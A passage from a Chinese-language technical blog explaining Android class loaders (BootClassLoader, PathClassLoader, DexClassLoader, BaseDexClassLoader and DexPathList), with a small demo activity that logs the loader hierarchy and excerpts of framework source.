com.example.classloaderdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;ClassLoaderDemo&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 获取当前应用的类加载器（PathClassLoader）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">pathClassLoader</span> <span class="operator">=</span> getClassLoader();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;PathClassLoader: &quot;</span> + pathClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 获取 BootClassLoader（引导类加载器）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">bootClassLoader</span> <span class="operator">=</span> pathClassLoader.getParent();</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;BootClassLoader: &quot;</span> + bootClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 获取外部 Dex（动态加载）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dexPath</span> <span class="operator">=</span> <span class="string">&quot;/sdcard/external.dex&quot;</span>; <span class="comment">// 需要手动放置一个 dex 文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">optimizedDir</span> <span class="operator">=</span> getDir(<span class="string">&quot;dex&quot;</span>, MODE_PRIVATE);</span><br><span class="line">        <span class="type">DexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(dexPath,</span><br><span class="line">                optimizedDir.getAbsolutePath(),</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                pathClassLoader);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;DexClassLoader: &quot;</span> + dexClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 打印类加载器的层级关系</span></span><br><span class="line">        printClassLoaderHierarchy(dexClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">printClassLoaderHierarchy</span><span class="params">(ClassLoader classLoader)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;ClassLoader: &quot;</span> + classLoader);</span><br><span class="line">            classLoader = classLoader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Reached BootClassLoader (null)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>日志输出如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PathClassLoader: dalvik.system.PathClassLoader[DexPathList[[zip file &quot;/data/app/\~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/base.apk&quot;],nativeLibraryDirectories=[/data/app/\~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/lib/arm64, /system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">BootClassLoader: java.lang.BootClassLoader@31eea01</span><br><span class="line">ClassLoader referenced unknown path: /sdcard/external.dex</span><br><span class="line">DexClassLoader: dalvik.system.DexClassLoader[DexPathList[[],nativeLibraryDirectories=[/system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">ClassLoader: dalvik.system.DexClassLoader[DexPathList[[],nativeLibraryDirectories=[/system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">ClassLoader: dalvik.system.PathClassLoader[DexPathList[[zip file &quot;/data/app/\~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/base.apk&quot;],nativeLibraryDirectories=[/data/app/~~qHxEOlv8MqCgwCgGZR5sdQ==/com.example.classloaderdemo-zI8ZQUdmTUh3v21YxUjwhg==/lib/arm64, /system/lib64, /system/system_ext/lib64, /system/product/lib64, /vendor/lib64]]]</span><br><span class="line">ClassLoader: java.lang.BootClassLoader@31eea01</span><br><span class="line">Reached BootClassLoader (null)</span><br></pre></td></tr></table></figure><h2 id="BootClassLoader"><a href="#BootClassLoader" class="headerlink" title="BootClassLoader"></a>BootClassLoader</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BootClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.classForName(name, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// .....</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; loadClass(String className, <span class="type">boolean</span> resolve)</span><br><span class="line">           <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = findLoadedClass(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = findClass(className);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>BootClassLoader重写了findClass和loadClass两个方法</p><p>当一个类不存在时会调用<code>Class.classForName</code>进行类的加载, 与加载基本类时的<code>Class.forName()</code>不同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ublic <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Class</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable,</span><br><span class="line">                              GenericDeclaration,</span><br><span class="line">                              Type,</span><br><span class="line">                              AnnotatedElement &#123;</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className)</span><br><span class="line">                <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">        <span class="keyword">return</span> forName(className, <span class="literal">true</span>, ClassLoader.getClassLoader(caller));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="type">boolean</span> initialize,</span><br><span class="line">                                   ClassLoader loader)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">            loader = BootClassLoader.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; result;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            result = classForName(name, initialize, loader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">            <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> LinkageError) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (LinkageError) cause;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 本地方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">native</span> Class&lt;?&gt; classForName(String className, <span class="type">boolean</span> shouldInitialize,</span><br><span class="line">            ClassLoader classLoader) <span class="keyword">throws</span> ClassNotFoundException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现forName实际上调用的还是classForName</p><p>ZygoteInit.preloadClasses()中调用Class.forName()，实际是指定BootClassLoader为类加载器，且只需要在预加载的时候进行类初始化，只需要一次<br>总之，通过 Class.forName() 或者 Class.classForName() 可以且仅可以直接加载基本类，一旦基本类预加载后，对于应用程序而言，我们虽然不能直接访问BootClassLoader，但可以通过Class.forName/Class.classForName加载</p><h3 id="class文件加载"><a href="#class文件加载" class="headerlink" title="class文件加载"></a>class文件加载</h3><p>类加载时机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.隐式加载:</span><br><span class="line">(1)创建类的实例,也就是new一个对象</span><br><span class="line">(2)访问某个类或接口的静态变量,或者对该静态变量赋值</span><br><span class="line">(3)调用类的静态方法</span><br><span class="line">(4)反射Class.forName(&quot;android.app.ActivityThread&quot;)</span><br><span class="line">(5)初始化一个类的子类(会首先初始化子类的父类)</span><br><span class="line">2.显示加载：</span><br><span class="line">(1)使用LoadClass()加载</span><br><span class="line">(2)使用forName()加载</span><br></pre></td></tr></table></figure><p>Class.forName 和 ClassLoader.loadClass加载有何不同：<br>（1）ClassLoader.loadClass也能加载一个类,但是不会触发类的初始化(也就是说不会对类的静态变量,静态代码块进行初始化操作)<br>（2）Class.forName这种方式,不但会加载一个类,还会触发类的初始化阶段,也能够为这个类的静态变量,静态代码块进行初始化操作</p><h2 id="PathClassLoader"><a href="#PathClassLoader" class="headerlink" title="PathClassLoader"></a>PathClassLoader</h2><p>PathClassLoader 是作为应用程序的系统类加载器，也是在 Zygote 进程启动的时候初始化的</p><p>基本流程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZygoteInit.main() -&gt; </span><br><span class="line">ZygoteInit.forkSystemServer() -&gt; </span><br><span class="line">ZygoteInit.handleSystemServerProcess() -&gt; </span><br><span class="line">ZygoteInit.createPathClassLoader()</span><br></pre></td></tr></table></figure><p>在预加载基本类之后执行，所以每一个 APP 进程从 Zygote 中 fork 出来之后都自动携带了一个 PathClassLoader，它通常用于加载 apk 里面的 .dex 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PathClassLoader</span> <span class="keyword">extends</span> <span class="title class_">BaseDexClassLoader</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PathClassLoader</span><span class="params">(String dexPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(dexPath, <span class="literal">null</span>, <span class="literal">null</span>, parent);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PathClassLoader</span><span class="params">(String dexPath, String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(dexPath, <span class="literal">null</span>, librarySearchPath, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DexClassLoader"><a href="#DexClassLoader" class="headerlink" title="DexClassLoader"></a>DexClassLoader</h2><p>可以从包含classes.dex的jar或者apk中，加载类的类加载器, 可用于执行动态加载, 但必须是app私有可写目录来缓存odex文件. 能够加载系统没有安装的apk或者jar文件， 因此很多热修复和插件化方案都是采用DexClassLoader</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> </span><br><span class="line"><span class="title class_">DexClassLoader</span> <span class="keyword">extends</span> <span class="title class_">BaseDexClassLoader</span> &#123;    </span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">DexClassLoader</span><span class="params">(String dexPath, String optimizedDirectory,</span></span><br><span class="line"><span class="params">            String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(dexPath, <span class="keyword">new</span> <span class="title class_">File</span>(optimizedDirectory), librarySearchPath, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与PathClassLoader相比, DexClassLoader提供了optimizedDirectory，而PathClassLoader则没有</p><p>optimizedDirectory正是用来存放odex文件的地方，所以可以利用DexClassLoader实现动态加载</p><h2 id="BaseDexClassLoader"><a href="#BaseDexClassLoader" class="headerlink" title="BaseDexClassLoader"></a>BaseDexClassLoader</h2><p>BaseDexClassLoader是PathClassLoader和DexClassLoader共同的父类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseDexClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DexPathList pathList;</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseDexClassLoader</span><span class="params">(String dexPath, File optimizedDirectory,String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(dexPath, optimizedDirectory, librarySearchPath, parent, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseDexClassLoader</span><span class="params">(String dexPath, File optimizedDirectory,String librarySearchPath, ClassLoader parent, <span class="type">boolean</span> isTrusted)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="built_in">this</span>.pathList = <span class="keyword">new</span> <span class="title class_">DexPathList</span>(<span class="built_in">this</span>, dexPath, librarySearchPath, <span class="literal">null</span>, isTrusted);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (reporter != <span class="literal">null</span>) &#123;</span><br><span class="line">            reportClassLoaderChain();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        List&lt;Throwable&gt; suppressedExceptions = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Throwable&gt;();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> pathList.findClass(name, suppressedExceptions);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ClassNotFoundException</span> <span class="variable">cnfe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(</span><br><span class="line">                    <span class="string">&quot;Didn&#x27;t find class \&quot;&quot;</span> + name + <span class="string">&quot;\&quot; on path: &quot;</span> + pathList);</span><br><span class="line">            <span class="keyword">for</span> (Throwable t : suppressedExceptions) &#123;</span><br><span class="line">                cnfe.addSuppressed(t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> cnfe;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BaseDexClassLoader继承于ClassLoader, 额外增加了pathList字段, 并且重写了类加载函数findClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dexPath: 包含目标类或资源的apk/jar列表;当有多个路径则采用:分割;</span><br><span class="line">optimizedDirectory: 优化后dex文件存在的目录, 可以为<span class="literal">null</span>;</span><br><span class="line">libraryPath: <span class="keyword">native</span>库所在路径列表;当有多个路径则采用:分割;</span><br><span class="line">ClassLoader:父类的类加载器</span><br></pre></td></tr></table></figure><p>并且其findClass其实是委托给了pathList的.findClass函数</p><h3 id="PathList"><a href="#PathList" class="headerlink" title="PathList"></a>PathList</h3><p>该类主要用来查找Dex、SO库的路径，并这些路径整体呈一个数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">DexPathList</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Element[] dexElements;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; nativeLibraryDirectories;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; systemNativeLibraryDirectories;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">DexPathList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DexPathList</span><span class="params">(ClassLoader definingContext, String dexPath,String libraryPath, File optimizedDirectory)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">this</span>.definingContext = definingContext;</span><br><span class="line">        ArrayList&lt;IOException&gt; suppressedExceptions = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;IOException&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//记录所有的dexFile文件</span></span><br><span class="line">        <span class="built_in">this</span>.dexElements = makePathElements(splitDexPath(dexPath), optimizedDirectory, suppressedExceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//app目录的native库</span></span><br><span class="line">        <span class="built_in">this</span>.nativeLibraryDirectories = splitPaths(libraryPath, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//系统目录的native库</span></span><br><span class="line">        <span class="built_in">this</span>.systemNativeLibraryDirectories = splitPaths(System.getProperty(<span class="string">&quot;java.library.path&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">        List&lt;File&gt; allNativeLibraryDirectories = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(nativeLibraryDirectories);</span><br><span class="line">        allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories);</span><br><span class="line">        <span class="comment">//记录所有的Native动态库</span></span><br><span class="line">        <span class="built_in">this</span>.nativeLibraryPathElements = makePathElements(allNativeLibraryDirectories, <span class="literal">null</span>, suppressedExceptions);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DexPathList初始化过程，主要收集以下两个变量信息：<br>（1）dexElements: 根据多路径的分隔符<code>;</code>将dexPath转换成File列表，记录所有的dexFile<br>（2）nativeLibraryPathElements: 记录所有的Native动态库, 包括app目录的native库和系统目录的native库</p><p><strong>makePathElements：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Element[] makePathElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class="line">        List&lt;IOException&gt; suppressedExceptions) &#123;</span><br><span class="line">    <span class="keyword">return</span> makeDexElements(files, optimizedDirectory, suppressedExceptions, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>makeDexElements：</strong></p><p>makeDexElements方法的作用是获取一个包含dex文件的元素集合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class="line">        List&lt;IOException&gt; suppressedExceptions, ClassLoader loader, <span class="type">boolean</span> isTrusted) &#123;</span><br><span class="line">  Element[] elements = <span class="keyword">new</span> <span class="title class_">Element</span>[files.size()];  <span class="comment">//获取文件个数</span></span><br><span class="line">  <span class="type">int</span> <span class="variable">elementsPos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">      <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">          elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(file);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> file.getName();</span><br><span class="line">          <span class="type">DexFile</span> <span class="variable">dex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">          <span class="comment">//匹配以.dex为后缀的文件</span></span><br><span class="line">          <span class="keyword">if</span> (name.endsWith(DEX_SUFFIX)) &#123;</span><br><span class="line">              dex = loadDexFile(file, optimizedDirectory, loader, elements);</span><br><span class="line">              <span class="keyword">if</span> (dex != <span class="literal">null</span>) &#123;</span><br><span class="line">                  elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(dex, <span class="literal">null</span>);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              dex = loadDexFile(file, optimizedDirectory, loader, elements);              </span><br><span class="line">              <span class="keyword">if</span> (dex == <span class="literal">null</span>) &#123;</span><br><span class="line">                  elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(file);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  elements[elementsPos++] = <span class="keyword">new</span> <span class="title class_">Element</span>(dex, file);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (dex != <span class="literal">null</span> &amp;&amp; isTrusted) &#123;</span><br><span class="line">            dex.setTrusted();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          System.logW(<span class="string">&quot;ClassLoader referenced unknown path: &quot;</span> + file);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (elementsPos != elements.length) &#123;</span><br><span class="line">      elements = Arrays.copyOf(elements, elementsPos);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elements;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法的主要功能是创建Element数组</p><p><strong>loadDexFile：</strong></p><p>加载DexFile文件，而且会把优化后的dex文件缓存到对应目录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> DexFile <span class="title function_">loadDexFile</span><span class="params">(File file, File optimizedDirectory, ClassLoader loader,</span></span><br><span class="line"><span class="params">                                   Element[] elements)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (optimizedDirectory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DexFile</span>(file, loader, elements);  <span class="comment">//创建DexFile对象</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">optimizedPath</span> <span class="operator">=</span> optimizedPathFor(file, optimizedDirectory);</span><br><span class="line">        <span class="keyword">return</span> DexFile.loadDex(file.getPath(), optimizedPath, <span class="number">0</span>, loader, elements);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DexFile：</strong></p><p>用来描述Dex文件，Dex的加载以及Class的查找都是由该类调用它的native方法完成的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DexFile(File file, ClassLoader loader, DexPathList.Element[] elements)</span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>(file.getPath(), loader, elements);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 